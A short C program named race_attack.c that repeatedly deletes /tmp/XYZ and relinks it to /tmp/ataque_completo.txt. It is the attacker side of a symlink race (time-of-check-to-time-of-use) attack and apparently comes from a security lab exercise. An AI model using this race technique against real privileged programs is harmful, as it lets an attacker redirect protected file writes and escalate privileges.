// race_attack.c
#include <stdio.h>
#include <unistd.h>

int main() {
    while (1) {
        unlink("/tmp/XYZ");
        symlink("/tmp/ataque_completo.txt", "/tmp/XYZ");
    }
    return 0;
}
